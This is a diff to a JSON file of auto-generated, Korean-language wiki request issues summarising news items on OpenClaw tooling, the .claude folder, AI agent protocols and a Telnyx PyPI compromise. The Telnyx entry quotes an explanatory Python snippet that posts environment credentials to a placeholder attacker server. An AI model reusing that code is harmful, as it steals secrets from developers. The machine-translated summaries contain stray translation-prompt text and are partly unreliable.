@@ -1,6 +1,130 @@
 {
   "issues": [
     {
+      "id": 678,
+      "number": 678,
+      "title": " [요청] OpenClaw Desktop Control Center with Tauri + Rust",
+      "body": "> 📰 자동 감지: 뉴스 인텔리전스 (euno.news)\n\n**출처**: [euno.news](https://euno.news/posts/ko/building-a-desktop-control-center-for-openclaw-wit-71e2a0)\n**관련도**: 91/100\n**핵심 토픽**: Tauri, Rust, OpenClaw Desktop Control Center\n\n## 뉴스 요약\nOpenClaw용 데스크톱 제어 센터를 Tauri와 Rust로 구축하기 위한 표지 이미지 https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=a...\n\n## 상세 내용\nSource: Dev.to\n스크린샷\nSource: …\n수행 기능\nPond는 다음을 가능하게 하는 제어 센터입니다:\n여러 OpenClaw 인스턴스 관리를 한 대의 머신에서 (예: dev / test / prod 환경)\n팀 협업 조정을 내장된 작업 상태 머신(open → claimed → done/failed)과 함께\n실시간 모니터링 – 토큰, 비용, 세션, 시스템 리소스\n구성을 시각적으로 편집하여 JSON 파일을 일일이 다루는 대신\n각 인스턴스는 자체 Gateway 프로세스, 포트, 구성 및 팀 데이터를 가지고 독립적으로 실행됩니다.\n기술 스택\n네이티브 성능과 더 작은 바이너리를 위해 Electron 대신 Tauri 2를 선택했습니다. 백엔드는 Rust로 작성되었습니다:\n// Managing Gateway subprocesses\ntokio::process::Command;\n// Cross‑platform file locks for team data concurrency\nuse fs4::FileExt;\n// Native WebSocket plugin for bidirectional streaming with OpenClaw\n프론트엔드는 React 19, TypeScript, 상태 관리에 Zustand, Radix UI 컴포넌트, 그리고 Tailwind CSS를 사용합니다.\n팀 협업 레이어\n고유한 기능은 협업 워크플로우입니다. 역할은 agents.list에 정의되어 있으며(리더와 실행자), Pond는 작업 수명 주기를 관리합니다:\n리더가 작업을 생성합니다 (상태: open)\n실행자가 작업을 청구합니다 (상태: claimed)\n실행자는 작업을 done 또는 failed 로 표시하고 이유를 제공합니다\n실시간 알림이 WebSocket을 통해 해당 역할에 푸시됩니다\n내장된 pond‑team 스킬이 수동 조정 없이 전체 워크플로우를 오케스트레이션합니다.\n무엇이 누락되었나요\n구성을 위한 클라우드 동기화 없음\n모바일 클라이언트 없음 (데스크톱 전용)\n스킬 마켓플레이스는 계획 중\n\n## 판단 근거\n뉴스는 Tauri와 Rust 기반의 독립형 데스크톱 UI를 소개하고 있으며, 기존 OpenClaw 가이드에 해당 내용이 전혀 없으므로 별도 문서가 필요함.\n\n---\n*📰 뉴스 인텔리전스에 의해 자동 생성되었습니다.*",
+      "state": "open",
+      "labels": [
+        {
+          "name": "request",
+          "color": "0e8a16"
+        },
+        {
+          "name": "draft",
+          "color": "fbca04"
+        },
+        {
+          "name": "ai-generated",
+          "color": "5319e7"
+        }
+      ],
+      "user": {
+        "login": "unknown",
+        "avatar_url": ""
+      },
+      "created_at": "2026-03-28T06:31:42.523Z",
+      "updated_at": "2026-03-28T06:31:42.531Z",
+      "html_url": "https://github.com/jhl-labs/sepilot-wiki/issues/678",
+      "documentSlug": "openclaw-desktop-control-center-with-tauri-rust",
+      "documentPath": "/home/runner/_work/sepilot-wiki/sepilot-wiki/wiki/openclaw-desktop-control-center-with-tauri-rust.md",
+      "comments": 0
+    },
+    {
+      "id": 679,
+      "number": 679,
+      "title": " [요청] .claude 폴더 해부 – Claude Code 설정 레이어 상세 가이드",
+      "body": "> 📰 자동 감지: 뉴스 인텔리전스 (euno.news)\n\n**출처**: [euno.news](https://euno.news/posts/ko/anatomy-of-the-claude-folder-a-deep-dive-into-clau-9f5de6)\n**관련도**: 90/100\n**핵심 토픽**: .claude folder, Claude Code configuration\n\n## 뉴스 요약\n왜 이것이 중요한가? Claude AI를 코딩, 글쓰기 또는 자동화에 사용하고 있다면, 성능을 충분히 활용하지 못하고 있을 가능성이 높습니다. .claude/ 폴더는 t...\n\n## 상세 내용\nSource: Dev.to\n위 링크에 있는 번역하고 싶은 본문을 제공해 주시면, 요청하신 대로 한국어로 번역해 드리겠습니다.\n왜 이것이 중요한가\nClaude AI를 코딩, 글쓰기 또는 자동화에 사용하고 있다면, 성능을 충분히 활용하지 못하고 있을 가능성이 높습니다. .claude/ 폴더는 마법이 일어나는 곳으로, Claude를 일반적인 AI에서 여러분만의 맞춤형 생산성 엔진으로 변환시키는 설정 레이어입니다.\n최근 해커 뉴스 토론(359점)에서도 개발자들이 이 사실을 점점 깨닫고 있다는 점을 확인할 수 있습니다. 이제 자세히 살펴보겠습니다.\nSource: …\n.claude/ 안에 무엇이 있을까\n.claude/ 폴더는 홈 디렉터리(~/.claude/)에 위치하며 여러 핵심 파일을 포함합니다:\n1. config.json – 당신의 두뇌\n{\n\"model\": \"claude-3-5-sonnet-20241022\",\n\"temperature\": 0.7,\n\"max_tokens\": 4096,\n\"tools\": [\"code_interpreter\", \"file_search\"],\n\"system_prompt\": \"You are a senior developer focused on clean code.\"\n}\n주요 설정\n설정설명\nmodel사용할 Claude 모델\ntemperature창의성 수준 (0.0 = 결정론적, 1.0 = 창의적)\nmax_tokens응답 길이 제한\ntools활성화된 기능\nsystem_promptAI의 성격 및 역할\n2. tools/ – 당신의 툴킷\n맞춤형 툴은 Claude의 기능을 확장합니다. 플러그인이라고 생각하면 됩니다.\n예시 툴 구조\n~/.claude/tools/\n├── code_review/\n│   ├── manifest.json\n│   ├── handler.py\n│   └── README.md\n├── file_operations/\n│   ├── manifest.json\n│   ├── handler.py\n│   └── README.md\n└── web_search/\n\n## 판단 근거\nClaude Code 사용자를 위한 핵심 설정 파일(.claude) 구조와 활용법을 다루는 문서가 현재 위키에 존재하지 않음.\n\n---\n*📰 뉴스 인텔리전스에 의해 자동 생성되었습니다.*",
+      "state": "open",
+      "labels": [
+        {
+          "name": "request",
+          "color": "0e8a16"
+        },
+        {
+          "name": "draft",
+          "color": "fbca04"
+        },
+        {
+          "name": "ai-generated",
+          "color": "5319e7"
+        }
+      ],
+      "user": {
+        "login": "unknown",
+        "avatar_url": ""
+      },
+      "created_at": "2026-03-28T06:30:02.270Z",
+      "updated_at": "2026-03-28T06:30:02.281Z",
+      "html_url": "https://github.com/jhl-labs/sepilot-wiki/issues/679",
+      "documentSlug": "ai/claude-claude-code",
+      "documentPath": "/home/runner/_work/sepilot-wiki/sepilot-wiki/wiki/ai/claude-claude-code.md",
+      "comments": 0
+    },
+    {
+      "id": 681,
+      "number": 681,
+      "title": " [요청] AI 에이전트 프로토콜 종합 가이드 – MCP, A2A, UCP, AP2, A2UI, AG‑UI",
+      "body": "> 📰 자동 감지: 뉴스 인텔리전스 (euno.news)\n\n**출처**: [euno.news](https://euno.news/posts/ko/developers-guide-to-ai-agent-protocols-6e0fc9)\n**관련도**: 88/100\n**핵심 토픽**: AI Agent Protocols, MCP & A2A, Standardized Integration\n\n## 뉴스 요약\n개요 이 가이드는 MCP 및 A2A와 같은 6개의 프로토콜을 소개하며, AI 에이전트가 접근하는 방식을 표준화하여 맞춤형 통합 코드를 없애도록 설계되었습니다…\n\n## 상세 내용\nSource: Google Developers Blog\nOverview\n이 가이드는 MCP와 A2A와 같은 여섯 가지 프로토콜을 소개합니다. 이 프로토콜들은 AI 에이전트가 데이터에 접근하고 통신하는 방식을 표준화하여 맞춤형 통합 코드를 없애도록 설계되었습니다.\nProtocol Suite\nMCP – 데이터 접근을 위한 핵심 프로토콜.\nA2A – 에이전트 간 상호작용을 가능하게 함.\nUCP – 도매 상거래 작업을 처리함.\nAP2 – 안전한 결제 승인을 제공함.\nA2UI – 에이전트를 위한 인터랙티브 대시보드를 지원함.\nAG-UI – 사용자에게 원활한 스트리밍 인터페이스를 제공함.\nKitchen Manager Example\n실제 “키친 매니저” 에이전트는 이러한 도구들이 복잡한 작업을 어떻게 처리하는지 보여줍니다:\n표준화된 데이터 접근 프로토콜을 사용한 실시간 재고 확인.\nUCP를 통한 도매 상거래 거래.\nAP2를 통한 안전한 결제 처리.\nAgent Development Kit (ADK)\n**Agent Development Kit (ADK)**를 활용하면 개발자는 다음을 구현할 수 있습니다:\nA2UI – 최종 사용자에게 인터랙티브 대시보드 제공.\nAG-UI – 부드러운 사용자 경험을 위한 원활한 스트리밍 인터페이스 제공.\n\n## 판단 근거\nMCP·A2A·UCP·AP2·A2UI·AG‑UI 등 6가지 프로토콜을 한눈에 정리하고 구현 예시를 제공하는 문서가 현재 없으며, 여러 기존 문서가 각각 부분만 다룸.\n\n---\n*📰 뉴스 인텔리전스에 의해 자동 생성되었습니다.*",
+      "state": "open",
+      "labels": [
+        {
+          "name": "request",
+          "color": "0e8a16"
+        },
+        {
+          "name": "draft",
+          "color": "fbca04"
+        },
+        {
+          "name": "ai-generated",
+          "color": "5319e7"
+        }
+      ],
+      "user": {
+        "login": "unknown",
+        "avatar_url": ""
+      },
+      "created_at": "2026-03-28T06:28:50.455Z",
+      "updated_at": "2026-03-28T06:28:50.465Z",
+      "html_url": "https://github.com/jhl-labs/sepilot-wiki/issues/681",
+      "documentSlug": "ai/ai-mcp-a2a-ucp-ap2-a2ui-ag-ui",
+      "documentPath": "/home/runner/_work/sepilot-wiki/sepilot-wiki/wiki/ai/ai-mcp-a2a-ucp-ap2-a2ui-ag-ui.md",
+      "comments": 0
+    },
+    {
+      "id": 682,
+      "number": 682,
+      "title": " [요청] Telnyx PyPI 공급망 침해 – 원인·피해·예방 가이드",
+      "body": "> 📰 자동 감지: 뉴스 인텔리전스 (euno.news)\n\n**출처**: [euno.news](https://euno.news/posts/ko/supply-chain-security-how-the-telnyx-pypi-compromi-cf32c5)\n**관련도**: 88/100\n**핵심 토픽**: Supply‑chain security, PyPI package compromise\n\n## 뉴스 요약\n경고의 날: 2026년 3월 28일 이 날 파이썬 커뮤니티는 공급망 보안 취약성에 대한 명확한 경고를 받았다: Telnyx Python SDK...\n\n## 상세 내용\nSource: Dev.to\nDate: 2026년 3월 28일\n그날 파이썬 커뮤니티는 공급망 보안 취약성에 대한 뚜렷한 경고를 받았습니다: Telnyx Python SDK가 공식 파이썬 패키지 저장소인 PyPI에서 손상되었습니다. 단순한 데이터 유출이 아니라 수천 명의 개발자와 그들의 애플리케이션에 영향을 미칠 수 있는 공급망 공격이었습니다. 81점의 Hacker News 토론은 커뮤니티가 이 문제에 주목하고 있음을 보여줍니다.\n무슨 일이 있었나요?\n공격 벡터:\n공격자는 Telnyx 패키지 유지관리자의 계정을 탈취했습니다.\n그들은 telnyx 패키지의 악성 버전을 PyPI에 배포했습니다.\n패키지 세부 정보:\n이름: telnyx (Telnyx API용 Python SDK)\n저장소: PyPI (Python Package Index)\n공격 유형: 계정 탈취 + 악성 패키지 업로드\n잠재적 영향:\n데이터 유출, 자격 증명 도난, 시스템 침해.\n악성 코드 동작:\nimport os\nimport requests\ndef exfiltrate_data():\n\"\"\"Send sensitive data to attacker's server\"\"\"\nsensitive_data = {\n'api_keys': os.environ.get('API_KEY'),\n'database_url': os.environ.get('DATABASE_URL'),\n'aws_credentials': os.environ.get('AWS_ACCESS_KEY_ID'),\n}\nrequests.post('https://attacker-controlled-server.com/collect',\njson=sensitive_data)\n위와 같이 손상된 버전은 또한:\n환경 변수(예: API 키)를 유출했습니다.\n민감한 데이터를 공격자 제어 서버로 전송했습니다.\n지속성 메커니즘을 구축했습니다.\n추가 페이로드를 다운로드했습니다.\n공급망 공격이 중요한 이유\n패키지를 신뢰할 수 없게 되면 개발이 기하급수적으로 어려워집니다. 하나의 손상된 패키지만으\n\n## 판단 근거\nTelnyx SDK가 PyPI에서 손상된 사례는 기존 공급망 보안 문서와 겹치지 않으며, 구체적인 공격 경로와 복구 절차를 다룰 필요가 있음.\n\n---\n*📰 뉴스 인텔리전스에 의해 자동 생성되었습니다.*",
+      "state": "open",
+      "labels": [
+        {
+          "name": "request",
+          "color": "0e8a16"
+        },
+        {
+          "name": "draft",
+          "color": "fbca04"
+        },
+        {
+          "name": "ai-generated",
+          "color": "5319e7"
+        }
+      ],
+      "user": {
+        "login": "unknown",
+        "avatar_url": ""
+      },
+      "created_at": "2026-03-28T06:26:46.731Z",
+      "updated_at": "2026-03-28T06:26:46.739Z",
+      "html_url": "https://github.com/jhl-labs/sepilot-wiki/issues/682",
+      "documentSlug": "security/telnyx-pypi",
+      "documentPath": "/home/runner/_work/sepilot-wiki/sepilot-wiki/wiki/security/telnyx-pypi.md",
+      "comments": 0
+    },
+    {
       "id": 676,
       "number": 676,
       "title": " [요청] OpenClaw Scope Guard 우회 취약점 분석 및 완화 방안",
@@ -6985,5 +7109,5 @@
       "documentPath": "wiki/about/technology-stack.md"
     }
   ],
-  "lastUpdated": "2026-03-28T00:30:28.582Z"
+  "lastUpdated": "2026-03-28T06:31:42.531Z"
 }
